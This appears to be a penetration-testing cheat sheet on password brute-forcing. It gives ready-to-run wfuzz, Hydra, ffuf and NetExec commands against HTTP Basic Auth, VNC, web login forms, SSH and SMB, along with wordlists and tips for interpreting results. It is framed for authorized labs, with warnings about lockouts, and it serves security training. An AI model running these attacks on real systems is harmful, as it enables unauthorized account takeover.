# Brute Force / Password Attacks

Brute forcing is used to test username/password combinations against exposed services or login forms.

Use only after enumeration shows:
```text
valid service or login page
  -> likely usernames
  -> likely password source
  -> no lockout risk in lab / authorized scope
  -> controlled rate
```

note: in real environments, password attacks can trigger account lockouts, alerts, and incident response. Always confirm scope and lockout policy.

---

## Table of Contents

- [HTTP Basic Auth with wfuzz](#http-basic-auth-with-wfuzz)
- [HTTP Basic Auth with Hydra](#http-basic-auth-with-hydra)
- [VNC Brute Force with Hydra](#vnc-brute-force-with-hydra)
- [Web Form Brute Force with ffuf](#web-form-brute-force-with-ffuf)
- [Web Form Brute Force with Hydra](#web-form-brute-force-with-hydra)
- [SSH Brute Force with Hydra](#ssh-brute-force-with-hydra)
- [SMB Credential Validation](#smb-credential-validation)
- [Troubleshooting](#Troubleshooting)


Methodology
```text
identify service
  -> confirm authentication method
  -> collect usernames
  -> choose small targeted password list
  -> test slowly
  -> record valid creds
  -> validate access manually
```

Good username sources:
```text
web app users
email addresses
SMB/LDAP/RPC enum
default accounts
employee names
service names
metadata
```

Good password sources:
```text
default passwords
season/year patterns
common credential lists
discovered passwords
password reuse from other services
```


```bash
# Common credentials
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt

# Large list
/usr/share/wordlists/rockyou.txt

# Usernames
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```


| Signal | Meaning | Next Step |
|---|---|---|
| `200` after many `401`s | Possible valid login | Confirm manually |
| Different response size | Possible valid login or different app behavior | Inspect response |
| Redirect after POST | Possible login success | Follow redirect |
| New cookie issued | Possible valid session | Replay request |
| Account locked message | Stop immediately | Document lockout behavior |
| Timeout / no response | Service issue, filtering, or rate limiting | Reduce speed |


---

## HTTP Basic Auth with wfuzz

Use `wfuzz` when testing HTTP Basic Authentication with a small username list and password list.

Username list + password file
```bash
wfuzz \
-z list,alice,bob,charlie,administrator \
-z file,/usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt \
--basic FUZZ:FUZ2Z \
http://target.com/api/v1/user \
> output.txt
```

Search for successful responses:
```bash
grep " 200 " output.txt
```

Example output pattern:
```text
000000012:   200        1 L      1 W        485 Ch      "alice - qwerty"
000000200:   401        1 L      10 W       109 Ch      "bob - picture1"
```

Finding:
```text
200 -> likely valid credentials
401 -> invalid credentials or unauthorized
```

Common mistake:
```text
Do not assume every 200 is valid. Confirm by logging in manually or requesting an authenticated endpoint.
```

---

## HTTP Basic Auth with Hydra

Hydra can also test HTTP Basic Auth.
```bash
hydra -L users.txt -P passwords.txt target.com http-get /api/v1/user -t 4
```

Single username:
```bash
hydra -l username -P passwords.txt target.com http-get /api/v1/user -t 4
```

If the service uses HTTPS:
```bash
hydra -L users.txt -P passwords.txt target.com https-get /api/v1/user -t 4
```

---

## VNC Brute Force with Hydra

Use when VNC is exposed.
```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt target_ip vnc -t 4
```

Small targeted list is better:
```bash
hydra -s 5900 -P passwords.txt target_ip vnc -t 4
```

Finding:
```text
-s 5900       -> target VNC port
-P file       -> password list
target_ip     -> target host
vnc           -> Hydra module
-t 4          -> threads
```

Common mistake:
```text
VNC often uses password-only authentication, so there may be no username.
```

Validate after success:
```bash
vncviewer target_ip:5900
```

---

## Web Form Brute Force with ffuf

Use `ffuf` when testing a web login form and filtering by response behavior.

 Password fuzzing for one user
```bash
ffuf -u https://target.com/login \
-X POST \
-d "user=alice&pass=FUZZ" \
-w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-H "Content-Type: application/x-www-form-urlencoded" \
-fc 401 \
-t 10
```

```text
FUZZ    -> replaced by each password
-fc 401 -> filter out failed login responses
-t 10   -> use 10 threads
```

Username fuzzing with one password
```bash
ffuf -u https://target.com/login \
-X POST \
-d "user=FUZZ&pass=password" \
-w users.txt \
-H "Content-Type: application/x-www-form-urlencoded" \
-fc 401 \
-t 10
```

Filter by size instead of status code
- Some apps return `200` for both failed and successful logins --> filter by response size.

First observe response sizes:
```bash
ffuf -u https://target.com/login \
-X POST \
-d "user=alice&pass=FUZZ" \
-w passwords.txt \
-H "Content-Type: application/x-www-form-urlencoded"
```

Then filter the known failed size:
```bash
ffuf -u https://target.com/login \
-X POST \
-d "user=alice&pass=FUZZ" \
-w passwords.txt \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 1234
```

Other useful filters:
```bash
-fw 10     # filter by word count
-fl 5      # filter by line count
-fc 401    # filter by status code
```

---

## Web Form Brute Force with Hydra

Hydra can test form logins when you know the failure condition.

Example:
```bash
hydra -l alice -P passwords.txt target.com https-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid password" \
-t 4
```

HTTP version:
```bash
hydra -l alice -P passwords.txt target.com http-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid password" \
-t 4
```


```text
/login            -> login path
user=^USER^       -> username parameter
pass=^PASS^       -> password parameter
Invalid password  -> failure message in response
```

Common mistake:
```text
Hydra needs a reliable failure condition. If the failure string is wrong, results may be false positives or false negatives.
```

---

## SSH Brute Force with Hydra

Single username:
```bash
hydra -l username -P passwords.txt ssh://target_ip -t 4
```

Username file + password file:
```bash
hydra -L users.txt -P passwords.txt ssh://target_ip -t 4
```

Custom port:
```bash
hydra -s 2222 -l username -P passwords.txt ssh://target_ip -t 4
```

Stop after success:
```bash
hydra -l username -P passwords.txt ssh://target_ip -f -t 4
```

---

## SMB Credential Validation

For Windows/AD environments, prefer NetExec or CrackMapExec-style credential validation over blind brute forcing.

```bash
nxc smb target_ip -u users.txt -p passwords.txt --continue-on-success
```

Single user + password list:
```bash
nxc smb target_ip -u alice -p passwords.txt --continue-on-success
```

Domain context:
```bash
nxc smb target_ip -u users.txt -p passwords.txt -d domain.com --continue-on-success
```

Local auth context:
```bash
nxc smb target_ip -u administrator -p passwords.txt --local-auth
```

Common mistake:
```text
Testing a local account as a domain account, or a domain account as local auth.
```



---


## Troubleshooting

- brute forcing before enumeration
- using `rockyou.txt` immediately
- ignoring account lockout risk
- not checking whether the app returns `200` for failed logins
- filtering out useful responses too aggressively
- not saving valid credentials
- not testing credential reuse
- confusing local and domain authentication
- using too many threads
- relying on one tool when the response behavior needs manual inspection

Tips
- Start with small targeted lists.
- Use known usernames before guessing usernames.
- Confirm results manually.
- Save successful credentials immediately.
- Check credential reuse across services.
- Avoid huge wordlists unless you have a reason.
- Reduce threads if responses become unstable.
